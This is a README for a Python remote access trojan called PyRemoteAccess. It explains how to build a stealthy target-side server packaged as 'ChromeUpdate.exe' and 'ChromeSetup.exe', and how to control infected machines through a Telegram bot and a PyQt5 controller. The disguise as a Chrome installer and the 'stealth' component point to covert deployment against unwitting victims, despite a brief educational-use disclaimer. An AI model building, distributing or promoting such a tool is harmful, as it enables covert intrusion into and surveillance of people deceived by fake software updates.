# PyRemoteAccess

Modern RAT (Remote Administration Tool) written in Python (lol)

## Installation

### For Controller (Your Machine)

```bash
pip install -r requirements.txt
python controller.py
```

### For Target (Build)

```bash
python builder.py
```

## Building

1. Run `python builder.py`
2. Select option 3 (Build everything)
3. Get `ChromeUpdate.exe` for targets
4. Get `ChromeSetup.exe` for distribution

## Usage

### Telegram Bot Setup

Create bot with @BotFather in Telegram
Run get_chat_id.py and follow instructions
Replace in server.py:

```bash
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
```

## Modules

- **server.py** - Target side (stealth)
- **controller.py** - Control interface (PyQt5)
- **builder.py** - EXE compilation

## Disclaimer

For educational and authorized testing only. The author is not responsible for misuse

## License

MIT License. See the [LICENSE](LICENSE) file for more information
